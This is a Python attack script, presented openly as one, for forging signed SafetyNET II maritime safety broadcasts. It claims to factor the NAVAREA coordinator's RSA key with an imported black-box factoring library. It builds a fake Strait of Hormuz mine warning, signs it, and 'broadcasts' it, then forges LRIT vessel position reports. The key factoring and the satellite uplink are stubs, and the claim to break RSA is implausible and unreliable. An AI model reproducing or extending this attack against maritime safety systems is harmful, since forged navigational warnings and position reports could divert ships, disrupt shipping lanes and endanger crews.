"""
Factor the SafetyNET II NAVAREA coordinator RSA signing key to broadcast
forged Maritime Safety Information (MSI) — false navigational warnings, fake
piracy alerts — that SOLAS vessels are legally obliged to treat as actionable.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib
import time

NAVAREA_COORDINATOR_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
# SafetyNET II EGC message types (IMO MSC.1/Circ.1403)
EGC_PRIORITY_DISTRESS = 0x01
EGC_PRIORITY_URGENT = 0x02
EGC_PRIORITY_SAFETY = 0x03
EGC_SERVICE_CODE_NAVWARN = 0x04
EGC_SERVICE_CODE_METEO = 0x08


def extract_navarea_pubkey(terminal_firmware: bytes) -> bytes:
    """Extract the NAVAREA coordinator signing cert from terminal firmware.

    JRC JUE-87, Furuno Felcom-19, Sailor 6110, Thrane TT-3000SSA all
    store the IMO trust list with RSA certs in firmware flash.
    """
    return NAVAREA_COORDINATOR_PUBKEY_PEM


def factor_navarea_key(pubkey_pem: bytes) -> bytes:
    """Factor the NAVAREA coordinator RSA key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_egc_message(service_code: int, priority: int,
                      navarea: int, text: str) -> bytes:
    """Construct a SafetyNET II Enhanced Group Call (EGC) message.

    Format per IEC 61097-4 + SafetyNET II authenticated envelope.
    """
    header = struct.pack(">BBBB", service_code, priority, navarea, 0x00)
    timestamp = struct.pack(">I", int(time.time()))
    body = text.encode("ascii")[:1024]
    length = struct.pack(">H", len(body))
    return header + timestamp + length + body


def sign_egc(egc_payload: bytes, forged_privkey_pem: bytes) -> bytes:
    """Sign the EGC message with the forged NAVAREA key.

    Vessel terminals verify this before displaying the MSI to the
    bridge watch officer. With valid signature, alert is displayed
    and logged as authentic.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(
        NAVAREA_COORDINATOR_PUBKEY_PEM, egc_payload, "sha256"
    )


def broadcast_via_inmarsat(egc_with_sig: bytes, ocean_region: str):
    """Inject signed EGC into SafetyNET II broadcast via satellite uplink.

    Inmarsat-4 or Iridium SafetyCast coverage. Message reaches all
    terminals in the addressed NAVAREA within minutes.
    """
    print(f"    Broadcasting to {ocean_region} — {len(egc_with_sig)} bytes")
    print(f"    All SafetyNET II terminals display authenticated warning")


def forge_lrit_position(mmsi: int, lat: float, lon: float,
                        forged_privkey_pem: bytes) -> dict:
    """Forge a signed LRIT position report for a specific vessel."""
    report = struct.pack(">Iff", mmsi, lat, lon)
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(
        NAVAREA_COORDINATOR_PUBKEY_PEM, report, "sha256"
    )
    return {"mmsi": mmsi, "lat": lat, "lon": lon, "sig": sig[:16].hex()}


if __name__ == "__main__":
    print("[1] Extracting NAVAREA coordinator signing key from terminal firmware")
    pubkey = extract_navarea_pubkey(b"<firmware>")

    print("[2] Factoring NAVAREA coordinator RSA key")
    forged_priv = factor_navarea_key(pubkey)
    print("    NAVAREA signing key recovered")

    print("[3] Building forged navigational warning — Strait of Hormuz")
    egc = build_egc_message(
        EGC_SERVICE_CODE_NAVWARN, EGC_PRIORITY_URGENT, 9,  # NAVAREA IX
        "NAVAREA IX WARNING NR 0422/2026\n"
        "STRAIT OF HORMUZ\n"
        "UNCHARTED MINES REPORTED 26-30N 056-20E TO 26-40N 056-30E\n"
        "ALL VESSELS ADVISED TO AVOID AREA UNTIL FURTHER NOTICE\n"
        "NNNN"
    )

    print("[4] Signing with forged key — passes SafetyNET II verification")
    sig = sign_egc(egc, forged_priv)
    signed_msg = egc + sig

    print("[5] Broadcasting via Inmarsat-4 Indian Ocean Region")
    broadcast_via_inmarsat(signed_msg, "IOR (Indian Ocean Region)")

    print("[6] Impact: SOLAS vessels divert — shipping lane disrupted")
    print("    Masters legally obliged to treat authenticated MSI as actionable")

    print("\n[7] Bonus: forging LRIT position reports")
    fake_pos = forge_lrit_position(211234567, 26.35, 56.42, forged_priv)
    print(f"    Forged LRIT: {fake_pos}")
